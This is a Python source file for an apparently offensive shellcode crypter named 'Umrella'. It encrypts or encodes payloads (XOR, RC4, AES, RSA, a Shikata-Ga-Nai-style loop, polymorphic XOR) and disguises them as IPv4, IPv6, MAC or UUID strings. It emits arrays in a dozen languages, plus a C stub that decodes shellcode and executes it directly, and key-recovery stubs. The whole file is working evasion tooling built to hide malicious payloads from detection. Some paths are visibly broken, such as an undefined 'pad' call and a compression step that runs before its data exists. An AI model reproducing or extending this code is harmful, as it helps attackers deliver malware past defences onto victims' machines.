#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import binascii
import secrets
import sys
import zlib, gzip, bz2, lzma
from pathlib import Path
from typing import Callable, Union
import random
import os
import sys, types

try:
    from Crypto.Cipher import AES, ARC4, Salsa20, ChaCha20, PKCS1_OAEP
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad as _pad
except ImportError:
    sys.exit("[!] Install dependency: pip install pycryptodome")

try:
    from colorama import Fore, Back, Style, init as _cl_init
    _cl_init()
    COLOURS = [Fore.RED, Fore.GREEN, Fore.YELLOW,
               Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
except ImportError:
    class _N:          # colour fallback
        def __getattr__(self, _): return ""
    Fore = Style = _N()         # type: ignore
    COLOURS = [""]

BANNER_TEXT = "Umrella"      # ← change this string for another name

BANNER = rf"""
        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀|⣀⣀⣀⠀⠀⣤⡀⠀⠀⠀|⠀⠀⠀⠀         |
    |   ⠀|⠀⢀⡠⠔⠂⠉⠁⠀⠀⠀⡀⠤⠒⠉⠙⠲⢇⡀⠀⠀⠀⠀⠀⠀⠀
        ⢀⣠⣖⣁⣀⣀⣀⡀⠀⢀⠠⠈⠀⠀⠀⠀⠀⠀⠀⢹⠦⡀⠀⠀|⠀⠀
    |   ⠻⢯⡀⠀⢀⡠⠂⠉⠑⠣⠤⢄⣀⠀⠀⠀⠀⠀⠀⠈⡀⠈⢆⠀⠀⠀⠀
|       ⠀⠀⠙⠶⢀⡀⠀⠀⠀⠀⢀⠔⠁⠉⠖⡦⣄⠀⠀⠀⡇⠀⠀⠳⡀⠀⠀ |
        ⠀⠀⠀⠀⠀⠈⠑⢦⠀⡰⠁⠀⠀⡜⡜⠀⢀⠛⢦⡀⠇⠀⠀⠀⠱⠀⠀
    |   ⠀⠀|⠀⠀⠀⠀⠀⠙⠒⠢⠤⣸⡸⠁⠀⡌⠀⠀⠹⠤⣀⠀⠀⠀⢣⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀|⠀⠀⠰⠱⠑⢆⡐⠀⠀⠀⠀⠀⠀⡗⢦⠀⠈⡄
        ⠀⠀⠀|⠀⠀⠀⠀⠀⠀⢠⢣⠃⠀⠀⠉⠉⠉⠒⠤⡀⢰⠀⠀⢣⠀⡇
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢃⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠒⡷⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠎⠀⠀|⠀⠀⠀⠀⠀⠀|⠀⠀⠀⠀⠀⠀
|       ⠀⠀⠀|⠀⠀⠀⢀⣜⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          |
        ⠀⠀⣠⢤⠀⠀⢀⡎⢻⠂⠀⠀⠀⠀⠀⠀|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⡇⢸⡀⠀⡜⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ |
        ⠀⠀⠙⠤⣉⢉⡠⠎⠀⠀⠀⠀|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|⠀⠀⠀
    |
                𝚄𝚖𝚋𝚛𝚎𝚕𝚕𝚊
"""

def print_banner() -> None:
    for line in BANNER.splitlines():
        print(Fore.LIGHTBLUE_EX + Style.BRIGHT + line + Style.RESET_ALL)


print_banner()

# ---------------- Helpers -------------------------------------------------

def random_bytes(n: int) -> bytes:
    return secrets.token_bytes(n)

def what(file, h=None):
    return None

def ensure_hex_key(hex_str: str) -> bytes:
    hex_str = hex_str.lower().replace("0x", "")
    try:
        return bytes.fromhex(hex_str)
    except ValueError:
        sys.exit("[!] -key must be valid hexadecimal")



# ---------------- Symmetric ciphers --------------------------------------

def enc_aes_cbc(d: bytes, k: bytes) -> tuple[bytes, bytes]:
    # Normalize key length to 16, 24 or 32 bytes
    if len(k) not in (16, 24, 32):
        k = _pad(k, 16)[:16]
    iv = secrets.token_bytes(16)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(_pad(d, 16))
    return iv, ciphertext


def enc_rc4(d: bytes, k: bytes) -> bytes:
    return ARC4.new(k).encrypt(d)

def enc_xor(d: bytes, k: bytes) -> bytes:
    if not k:
        sys.exit("[!] XOR needs key")
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

def enc_salsa20(d: bytes, k: bytes) -> bytes:
    k = pad(k, 32)[:32] if len(k) not in (16, 32) else k
    c = Salsa20.new(key=k)
    return c.nonce + c.encrypt(d)

def enc_chacha20(d: bytes, k: bytes) -> bytes:
    k = pad(k, 32)[:32] if len(k) != 32 else k
    c = ChaCha20.new(key=k)
    return c.nonce + c.encrypt(d)

def enc_caesar(d: bytes, k: bytes) -> bytes:
    shift = k[0] if k else 13
    return bytes((b + shift) % 256 for b in d)

def enc_polymorphic(data: bytes, _unused_key: bytes) -> bytes:
    xor_key = random.randrange(0, 256)
    out = bytes(b ^ xor_key for b in data) + bytes([xor_key])
    return out

def stub_polymorphic_c(encoded: bytes, varname: str) -> bytes:
    length = len(encoded) - 1   # real shellcode length; last byte is key

    # build a few random NOOP comments
    noise = []
    for _ in range(random.randrange(1, 4)):
        noise.append(f"    /* NOOP_{random.randrange(1000, 9999)} */")
    noise_block = "\n".join(noise)

    # build hex array literal
    arr = ", ".join(f"0x{b:02x}" for b in encoded)
    stub = f"""
#include <stdio.h>
#include <stdlib.h>

// Polymorphic stub ID #{random.randrange(100000, 999999)}
unsigned char {varname}[] = {{ {arr} }};
size_t {varname}_len = {length};  // last byte is XOR key

int main(void) {{
{noise_block}
    unsigned char xor_key = {varname}[{length}];
    unsigned char *decoded = malloc({length});
    for (size_t i = 0; i < {length}; i++) {{
        decoded[i] = {varname}[i] ^ xor_key;
    }}
    // now `decoded` is actual shellcode – jump to it:
    void (*fn)() = (void (*)())decoded;
    fn();
    return 0;
}}
"""
    return stub.encode("utf-8")
## ────────────────────────────────────────────────────────────────────

SYMMETRIC_ENCRYPTORS: dict[str, Callable[[bytes, bytes], bytes]] = {
    "rc4": enc_rc4,
    "xor": enc_xor,
    "salsa20": enc_salsa20,
    "chacha20": enc_chacha20,
    "caesar": enc_caesar,
    "polymorphic": enc_polymorphic,
}




# ---------------- Obfuscators --------------------------------------------

def obf_ipv4(data: bytes) -> list[str]:
    out: list[str] = []
    for i in range(0, len(data), 4):
        chunk = data[i : i + 4]
        # If chunk is less than 4 bytes, pad with zeros:
        if len(chunk) < 4:
            chunk = chunk.ljust(4, b"\x00")
        out.append("%d.%d.%d.%d" % tuple(chunk))
    return out


def obf_ipv6(data: bytes) -> list[str]:
    import ipaddress

    out: list[str] = []
    for i in range(0, len(data), 16):
        chunk = data[i : i + 16]
        if len(chunk) < 16:
            chunk = chunk.ljust(16, b"\x00")
        # ipaddress.IPv6Address will compress zeroes properly
        out.append(str(ipaddress.IPv6Address(chunk)))
    return out


def obf_mac(data: bytes) -> list[str]:

    lines: list[str] = []
    for i in range(0, len(data), 6):
        chunk = data[i : i + 6]
        if len(chunk) < 6:
            chunk = chunk + b"\x00" * (6 - len(chunk))
        # NOTE: use uppercase and dashes instead of colons:
        lines.append("-".join(f"{b:02X}" for b in chunk))
    return lines


def obf_uuid(data: bytes) -> list[str]:

    import uuid

    out: list[str] = []
    for i in range(0, len(data), 16):
        chunk = data[i : i + 16]
        if len(chunk) < 16:
            chunk = chunk.ljust(16, b"\x00")
        out.append(str(uuid.UUID(bytes=chunk)))
    return out


def obf_reverse(data: bytes) -> bytes:
    """Pure byte‐reverse (no ASCII)."""
    return data[::-1]


def enc_shikata_ga_nai(data: bytes, rounds: int = 1) -> bytes:
 
    buf = data
    for _ in range(rounds):
        seed = random.randrange(0, 256)
        edx = seed
        ecx = seed
        out = bytearray()
        out.append(seed)
        for b in buf:
            al = b ^ edx
            out.append(al)
            new_edx = (edx + ecx) & 0xFF
            ecx = (new_edx + edx) & 0xFF
            edx = new_edx
        buf = bytes(out)
    return buf

OBFUSCATORS: dict[str, Callable[[bytes], Union[list[str], bytes]]] = {
    "ipv4": obf_ipv4,
    "ipv6": obf_ipv6,
    "mac":  obf_mac,
    "uuid": obf_uuid,
    "reverse": obf_reverse,
}



ENTROPY_ENCODERS = {
    "base32": base64.b32encode,
    "base64": base64.b64encode,
    "base16": base64.b16encode,
    "base85": base64.b85encode,
}

# ---------------- Formatters ---------------------------------------------

def bytes_to_c(n:str,d:bytes)->str: return f"unsigned char {n}[] = {{{', '.join(f'0x{b:02x}' for b in d)}}};"

def bytes_to_csharp(n:str,d:bytes)->str: return f"byte[] {n} = new byte[]{{{', '.join(f'0x{b:02x}' for b in d)}}};"

def bytes_to_py(n:str,d:bytes)->str: return f"{n} = b\""+''.join(f"\\x{b:02x}" for b in d)+"\""

def bytes_to_rust(n:str,d:bytes)->str: return f"let {n}: [u8; {len(d)}] = [{', '.join(f'0x{b:02x}' for b in d)}];"

def bytes_to_nim(n:str,d:bytes)->str: return f"var {n}: array[{len(d)}, byte] = [{', '.join(f'0x{b:02x}' for b in d)}]"

def bytes_to_java(n:str,d:bytes)->str: return f"byte[] {n} = new byte[]{{{', '.join(f'(byte)0x{b:02x}' for b in d)}}};"

def bytes_to_ps(n:str,d:bytes)->str: return f"[Byte[]]${n} = {','.join(f'0x{b:02x}' for b in d)}"

def bytes_to_vba(n:str,d:bytes)->str: return f"Dim {n}() As Byte\n{n} = Array({','.join(f'&H{b:02x}' for b in d)})"

def bytes_to_perl(n: str, d: bytes) -> str:
    # e.g. my $shellcode = "\xAA\xBB\xCC...";
    return f'my ${n} = "' + "".join(f"\\x{b:02x}" for b in d) + '";'

def bytes_to_ruby(n: str, d: bytes) -> str:
    # e.g. shellcode = "\xAA\xBB\xCC..."
    return f'{n} = "' + "".join(f"\\x{b:02x}" for b in d) + '"'

def bytes_to_go(n: str, d: bytes) -> str:
    # e.g. var shellcode = []byte{0xaa,0xbb,0xcc,...}
    items = ", ".join(f"0x{b:02x}" for b in d)
    return f"var {n} = []byte{{{items}}}"


FORMATTERS: dict[str, Callable[[str, bytes], Union[str, bytes]]] = {
    "raw": lambda _n,d:d,
    "c": bytes_to_c,
    "csharp": bytes_to_csharp,
    "python": bytes_to_py,
    "rust": bytes_to_rust,
    "nim": bytes_to_nim,
    "java": bytes_to_java,
    "powershell": bytes_to_ps,
    "vba": bytes_to_vba,
    "perl": bytes_to_perl,
    "ruby": bytes_to_ruby,
    "go": bytes_to_go,
}




# ---------------- CLI -----------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(description=Fore.LIGHTBLUE_EX + Style.BRIGHT + "Umrella that will protect your shellcode from rain."+ Style.RESET_ALL )
    p.add_argument("-i","--input", metavar="FILE")
    p.add_argument("-o","--output",  metavar="OUTPUT")
    grp = p.add_mutually_exclusive_group(required=True)
    grp.add_argument("-enc","--encrypt",choices=list(SYMMETRIC_ENCRYPTORS)+["rsa","shikata_ga_nai","aes"])
    grp.add_argument("-obf","--obfuscate",choices=OBFUSCATORS)
    grp.add_argument("--key-guard", action="store_true", help="Generate ProtectedKey + brute-forcer (no shellcode)")
    p.add_argument("-key", metavar="KEY(hex)")
    p.add_argument("-key-len",type=int, metavar="int")
    p.add_argument("-var",default="shellcode", metavar="variable_name")
    p.add_argument("-format","--format-shellcode",dest="fmt_sc",choices=FORMATTERS,default="raw")
    p.add_argument("-format-key",dest="fmt_key",choices=FORMATTERS,default="raw")
    p.add_argument("-stub-format",
                   choices=["c","csharp","python","rust","nim","java","powershell","vba"],
                   default="c",
                   help="Language of brute-force stub only when using --key-guard")
    p.add_argument(
        "-entropy",
        nargs="?",            # makes the argument optional
        const="base32",       # default when -entropy is present with no value
        choices=list(ENTROPY_ENCODERS),
        metavar="{base32,base64,base16,base85}",
        help="Apply Base-N encoding to final shellcode (default: base32)"
    )
    p.add_argument("-compress",
                choices=["zlib","gzip","bz2","lzma"],
                help="Compress processed data (zlib/gzip/bz2/lzma)")

    p.add_argument("-sub",help="Public key file (PEM for RSA / ASCII armor PGP)")
    p.add_argument("-rounds", type=int, default=1,
                help="Number of Shikata‐Ga‐Nai iterations (only used if -enc shikata_ga_nai)")
    p.add_argument("-stdout", action="store_true",
               help="Print final result to STDOUT (instead of writing to a file)")


    return p.parse_args()


# ─────────────────── key-guard helpers ────────────────────
# ── key-guard helpers ──────────────────────────────────────────────────
def make_protected_key(orig: bytes) -> tuple[bytes, int]:
    xor_b  = secrets.randbelow(256)
    prot   = bytes(((b+i)&0xFF) ^ xor_b for i,b in enumerate(orig))
    hint_b = prot[0] ^ xor_b
    return prot, hint_b

def stub_c(prot,hint,fmt):
    arr = fmt("g_ProtectedKey", prot)
    return f'''/* C brute-forcer */
#include <Windows.h>
#include <stdio.h>
#define HINT_BYTE 0x{hint:02X}
{arr}
static BYTE recXor(){{
  for(BYTE x=0;x<0xFF;++x) if((g_ProtectedKey[0]^x)==HINT_BYTE) return x;
  return 0;
}}
static void unwrap(BYTE xorB,BYTE*out,SIZE_T len){{
  for(SIZE_T i=0;i<len;i++) out[i]=(BYTE)(((g_ProtectedKey[i]^xorB)-i)&0xFF);
}}
BYTE* GetRealKey(SIZE_T*L){{
  SIZE_T len=sizeof(g_ProtectedKey); BYTE*x=malloc(len); unwrap(recXor(),x,len);
  if(L)*L=len; return x;
}}
int main(){{
  SIZE_T l; BYTE*k=GetRealKey(&l);
  for(SIZE_T i=0;i<l;i++) printf(\"%02X \",k[i]); puts(\"\"); free(k);}}
'''
# —— other languages ———————————————————————————————————————————
def stub_python(prot,hint,fmt):
    arr = fmt("prot",prot)
    return f'''{arr}\nHINT=0x{hint:02X}\nxor=next(x for x in range(256) if (prot[0]^x)==HINT)\nkey=bytes(((b^xor)-i)&0xFF for i,b in enumerate(prot))\nprint(key.hex())'''

def stub_csharp(prot,hint,fmt):
    arr=fmt("Prot",prot)
    return f'''using System; class BF{{ const byte H=0x{hint:02X}; {arr}\nstatic byte[] R(){{byte x=0;while(((Prot[0]^x)!=H))x++;byte[]k=new byte[Prot.Length];for(int i=0;i<k.Length;i++)k[i]=(byte)(((Prot[i]^x)-i)&0xFF);return k;}}\nstatic void Main(){{Console.WriteLine(BitConverter.ToString(R()));}}}}'''

def stub_rust(prot: bytes, hint: int, fmt):
    arr = fmt("PROT", prot)
    return f'''// Rust brute-forcer
const H: u8 = 0x{hint:02X};
{arr}

fn recover_xor() -> u8 {{
    (0u8..=255).find(|x| (PROT[0] ^ x) == H).unwrap()
}}

fn main() {{
    let xor = recover_xor();
    let key: Vec<u8> = PROT.iter().enumerate()
        .map(|(i, &b)| ((b ^ xor).wrapping_sub(i as u8)) & 0xFF)
        .collect();
    println!("{{{{:02X?}}}}", key);
}}
'''
    

def stub_nim(prot,hint,fmt):
    arr=fmt("prot",prot)
    return f'''const H:byte=0x{hint:02X}; {arr}\nvar x:byte=0;while((prot[0] xor x)!=H):inc x\nfor i,b in prot:echo(((b xor x)-byte(i)) and 0xFF).toHex'''

def stub_java(prot,hint,fmt):
    arr=fmt("PROT",prot)
    return f'''public class BF{{static final byte H=(byte)0x{hint:02X}; {arr}\nstatic byte[]R(){{byte x=0;while(((PROT[0]^x)!=H))x++;byte[]k=new byte[PROT.length];for(int i=0;i<k.length;i++)k[i]=(byte)(((PROT[i]^x)-i)&0xFF);return k;}}\npublic static void main(String[]a){{for(byte b:R())System.out.printf(\"%02X \",b);}}}}'''

def stub_ps(prot,hint,fmt):
    arr=fmt("$P",prot).replace("unsigned char ","# ")
    return f'''$H=0x{hint:02X}\n{arr}\n$x=0;while(($P[0]-bxor$x)-ne$H){{$x++}}\n$K=for($i=0;$i -lt $P.Length;$i++){{(($P[$i]-bxor$x)-$i)-band0xFF}}\n$K|%{{\"{0:X2}\"-f$_}}'''

def stub_vba(prot,hint,fmt):
    arr=fmt("P",prot)
    return f'''' VBA brute\nConst H As Byte=&H{hint:02X}\n{arr}\nSub R():Dim x As Byte:Do While((P(0) Xor x)<>H):x=x+1:Loop\nDim i:For i=0 To UBound(P):Debug.Print Hex(((P(i) Xor x)-i) And &HFF);:Next i:End Sub'''
# dispatch:
STUBS={"c":stub_c,"python":stub_python,"csharp":stub_csharp,"rust":stub_rust,
       "nim":stub_nim,"java":stub_java,"powershell":stub_ps,"vba":stub_vba}



# ---------------- Main ----------------------------------------------------


def main():
    a=parse_args()
# ── KEY-GUARD MODE ─────────────────────────────────────────────
    if a.key_guard:
        orig_key = ensure_hex_key(a.key) if a.key else random_bytes(a.key_len or 16)
        prot_key, hint = make_protected_key(orig_key)

        key_fmt = FORMATTERS[a.fmt_key]
        print("- Use The Following Key For Encryption: ")
        print(key_fmt("OriginalKey", orig_key), "\n")
        print("- Use The Following For Implementations:")
        print(key_fmt("ProtectedKey", prot_key), "\n")
        print("- key: " + orig_key.hex() + "\n")

        stub = STUBS[a.stub_format](prot_key, hint, key_fmt)
        print(stub)
        return


    if not a.input:
        sys.exit(Fore.RED + "[!] -i/--input is required unless you use --key-guard")
    if not Path(a.input).is_file():
        sys.exit(Fore.RED + f"[!] {a.input} not found")
    data=Path(a.input).read_bytes()
    if not data:
        sys.exit(Fore.RED + "[!] Input empty" + Style.RESET_ALL)

            # ── Compression layer ─────────────────────────────────────────
    if a.compress and "processed" in locals():
        if a.compress == "zlib":
            processed = zlib.compress(processed)
        elif a.compress == "gzip":
            processed = gzip.compress(processed)
        elif a.compress == "bz2":
            processed = bz2.compress(processed)
        elif a.compress == "lzma":
            processed = lzma.compress(processed)
        # Print out new size for convenience
        print(f"[+] After {a.compress} compression: {len(processed)} bytes")

        # ── Entropy layer ────────────────────────────────────


    processed:bytes
    key_mat:bytes|str=b""
    priv_pem: str|None=None
    pub_pem: str|None=None


    # --- encryption / obfuscation ------
    if a.encrypt in SYMMETRIC_ENCRYPTORS:
        key_mat = ensure_hex_key(a.key) if a.key else random_bytes(a.key_len or 16)
        processed = SYMMETRIC_ENCRYPTORS[a.encrypt](data, key_mat)


    elif a.encrypt == "shikata_ga_nai":
        processed = enc_shikata_ga_nai(data, a.rounds)
        key_mat = b""

    elif a.encrypt == "polymorphic":
    # We ignore a.key; the polymorphic function picks its own single‐byte XOR key.
        encoded = enc_polymorphic(data, b"")
        if a.fmt_sc == "c":
            processed = stub_polymorphic_c(encoded, a.var)
        else:
            # fallback: raw XOR’d bytes (including trailing key)
            processed = encoded
        key_mat = b""   # no separate key, it’s appended


    elif a.encrypt == "aes":
        key_mat = ensure_hex_key(a.key) if a.key else random_bytes(a.key_len or 16)
        iv, ciphertext = enc_aes_cbc(data, key_mat)

        # Format IV and ciphertext separately:
        iv_block  = FORMATTERS[a.fmt_sc]("AesIv", iv)
        ct_block  = FORMATTERS[a.fmt_sc](a.var, ciphertext)
        
        if a.stdout:
            if a.fmt_sc == "raw":
            # raw mode: send iv||ciphertext bytes to stdout buffer
                sys.stdout.buffer.write(iv + ciphertext)
            else:
            # textual mode: print IV block and CT block
                print(iv_block)
                print()
                print(ct_block)
        # Now print the key info (always to stdout)
            key_block = FORMATTERS[a.fmt_key]("AesKey", key_mat)
            key_hex = binascii.hexlify(key_mat).decode()
            print()
            print("- KEY:")
            print(key_block)
            print()
            print("- KEY (hex):")
            print(key_hex)
            return
    

        # Then print the key in the chosen format:
        key_block = FORMATTERS[a.fmt_key]("AesKey", key_mat)
        key_hex   = binascii.hexlify(key_mat).decode()
        print("\n- KEY:")
        print(key_block)
        print("\n- KEY (hex):")
        print(key_hex)
        print("\n- IV:")
        print(iv_block)
        if a.fmt_sc == "raw":
            out_file = Path(a.output or f"shellcode_{secrets.token_hex(4)}.bin")
            out_file.write_bytes(iv + ciphertext)
            print(f"IV+CT written as raw bytes → {out_file.resolve()}")
        else:
            out_file = Path(a.output or f"shellcode_{secrets.token_hex(4)}.{a.fmt_sc}")
            with open(out_file, "w") as f:
                f.write(iv_block + "\n\n" + ct_block)
            print("\n- OUTPUT FILE:")
            print(out_file.resolve())
        return

    elif a.encrypt == "rsa":
        # 1) load or generate the public key
        if a.sub:
            pub = RSA.import_key(Path(a.sub).read_bytes())
            pub_pem = pub.export_key().decode()
        else:
            kp = RSA.generate(a.key_len or 2048)
            priv_pem = kp.export_key().decode()
            pub = kp.public_key()
            pub_pem = pub.export_key().decode()

        # 2) check OAEP capacity   (SHA-1 hash ⇒ 20-byte overhead)
        key_bytes = pub.size_in_bytes()          # 256 for 2048-bit key
        hash_len  = 20
        max_len   = key_bytes - 2*hash_len - 2

        if len(data) > max_len:
            sys.exit(Fore.RED +
                f"[!] RSA-OAEP can encrypt at most {max_len} bytes with a "
                f"{pub.size_in_bits()}-bit key.  Your input is {len(data)} bytes.\n"
                "    → Use a larger key or switch to a hybrid AES+RSA mode."
            + Style.RESET_ALL)

        # 3) safe to encrypt
        processed = PKCS1_OAEP.new(pub).encrypt(data)
        key_mat   = pub.export_key(format="DER")

    elif a.obfuscate:
        res = OBFUSCATORS[a.obfuscate](data)

        # 1) If the obfuscator returned raw bytes (only 'reverse' does that),
        #    just forward them unchanged:
        if isinstance(res, (bytes, bytearray)):
            processed = bytes(res)
            key_mat   = b""

            
            # Now write exactly as you would for "raw" or any other format:
            ext = {"raw":".bin","c":".c","csharp":".cs","python":".py",
                   "rust":".rs","nim":".nim","java":".java",
                   "powershell":".ps1","vba":".vba"}[a.fmt_sc]
            out_file = Path(a.output) if a.output else Path(f"shellcode_{secrets.token_hex(4)}{ext}")

            if a.fmt_sc == "raw":
                out_file.write_bytes(processed)
            else:
                out_file.write_text(processed.decode(errors="ignore"))
            # key_mat already b"", so we can skip to the summary below
            print(Fore.LIGHTBLUE_EX + "\n- KEY:")
            print("<none>" + Style.RESET_ALL)
            print(Fore.LIGHTBLUE_EX + "\n- KEY (hex):")
            print("<none>" + Style.RESET_ALL)
            print(Fore.LIGHTBLUE_EX + "\n- OUTPUT FILE:")
            print(out_file.resolve())
            return

        # 2) Otherwise, we got a list[str] (e.g. IPv4, IPv6, MAC, UUID)
        lines: list[str] = res   # type: ignore[list]
        count = len(lines)
        # 3) Build a language‐specific array literal of strings:
        if a.fmt_sc == "c":
            # C: const char *shellcode[] = { "a.b.c.d", "w.x.y.z", … };
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"const char *{a.var}[] = {{ {arr} }};"
            processed = code.encode()

        elif a.fmt_sc == "csharp":
            # C#: string[] shellcode = new string[] { "a.b.c.d", … };
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"string[] {a.var} = new string[] {{ {arr} }};"
            processed = code.encode()

        elif a.fmt_sc == "python":
            # Python: shellcode = [ "a.b.c.d", "…", … ]
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"{a.var} = [ {arr} ]"
            processed = code.encode()

        elif a.fmt_sc == "rust":
            # Rust: let SHELLCODE: [&str; N] = [ "a.b.c.d", … ];
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"let {a.var}: [&str; {count}] = [ {arr} ];"
            processed = code.encode()

        elif a.fmt_sc == "nim":
            # Nim: var shellcode: array[N,string] = [ "a.b.c.d", … ]
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"var {a.var}: array[{count}, string] = [ {arr} ]"
            processed = code.encode()

        elif a.fmt_sc == "java":
            # Java: String[] shellcode = { "a.b.c.d", … };
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"String[] {a.var} = {{ {arr} }};"
            processed = code.encode()

        elif a.fmt_sc == "go":
            # Go: var shellcode = []string{ "a.b.c.d", … }
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"var {a.var} = []string{{ {arr} }}"
            processed = code.encode()

        elif a.fmt_sc == "perl":
            # Perl: my @shellcode = ("a.b.c.d", …);
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"my @{a.var} = ( {arr} );"
            processed = code.encode()

        elif a.fmt_sc == "ruby":
            # Ruby: shellcode = ["a.b.c.d", …]
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"{a.var} = [ {arr} ]"
            processed = code.encode()

        elif a.fmt_sc == "powershell":
            # PowerShell: $shellcode = @("a.b.c.d", "…", …)
            arr = ", ".join(f"'{s}'" for s in lines)
            code = f"${a.var} = @({arr})"
            processed = code.encode()

        elif a.fmt_sc == "vba":
            # VBA: Dim shellcode() As String
            #      shellcode = Array("a.b.c.d", "…", …)
            arr = ", ".join(f'"{s}"' for s in lines)
            code = f"Dim {a.var}() As String\n{a.var} = Array({arr})"
            processed = code.encode()

        else:
            # raw / fallback: newline‐separate them as plain text
            processed = "\n".join(lines).encode()

        key_mat = b""
        if a.stdout:
            # print to stdout instead of writing a file
            if a.fmt_sc == "raw":
                # raw bytes → write to stdout’s buffer
                sys.stdout.buffer.write(processed)
            else:
                # any textual format → decode and print
                print(processed.decode(), end="")
           
       
        # 4) Now write the result to disk exactly once, then print the summary:
        ext = {"raw":".bin","c":".c","csharp":".cs","python":".py",
               "rust":".rs","nim":".nim","java":".java",
               "powershell":".ps1","vba":".vba","go":".go","perl":".pl","ruby":".rb"}[a.fmt_sc]
        out_file = Path(a.output) if a.output else Path(f"shellcode_{secrets.token_hex(4)}{ext}")

        if a.fmt_sc == "raw":
            out_file.write_bytes(processed)
        else:
            out_file.write_text(processed.decode())
        print()
        print(Fore.LIGHTRED_EX + "\n- Number of elements: " + f"{count}")
        print("\n- OUTPUT FILE:")
        print(out_file.resolve())
        return

    else:
        sys.exit(Fore.RED + "[!] Invalid options")

    # Entropy layer
        # ── Entropy layer ────────────────────────────────────
    if a.entropy:
        encoder = ENTROPY_ENCODERS[a.entropy]
        processed = encoder(processed)

    if a.stdout:
        sc_block = FORMATTERS[a.fmt_sc](a.var, processed)
        if a.fmt_sc == "raw":
            # show raw bytes as hex
            print("- RAW BYTES (hex):")
            print(processed.hex())
        else:
            if isinstance(sc_block, (bytes, bytearray)):
                sys.stdout.buffer.write(sc_block)
            else:
                print(sc_block)
    # ------ Output preparation ------
    ext = {"raw":".bin","c":".c","csharp":".cs","python":".py","rust":".rs","nim":".nim","java":".java","powershell":".ps1","vba":".vba","perl":".pl","ruby":".rb","go":".go"}[a.fmt_sc]
    out_file = Path(a.output) if a.output else Path(f"shellcode_{secrets.token_hex(4)}{ext}")
    
    sc_block = FORMATTERS[a.fmt_sc](a.var, processed)
    if a.fmt_sc == "raw":
        out_file.write_bytes(sc_block)  # type: ignore[arg-type]
    else:
        out_file.write_text(sc_block)
    # Key output
    if key_mat:
        key_block = FORMATTERS[a.fmt_key]("key", key_mat if isinstance(key_mat, bytes) else key_mat.encode())  # type: ignore[arg-type]
        key_hex = binascii.hexlify(key_mat if isinstance(key_mat, bytes) else key_mat.encode()).decode()
    else:
        key_block, key_hex = "<none>", "<none>"

    
    # Console summary
    print("\n- KEY:")
    print(key_block)
    print("\n- KEY (hex):")
    print(key_hex)
    if pub_pem:
        print("\n- PUBLIC KEY (PEM):")
        print(pub_pem)
    if priv_pem:
        print("\n- PRIVATE KEY (PEM):")
        print(priv_pem)
    print("\n- OUTPUT FILE:")
    print(out_file.resolve())

if __name__ == "__main__":
    main()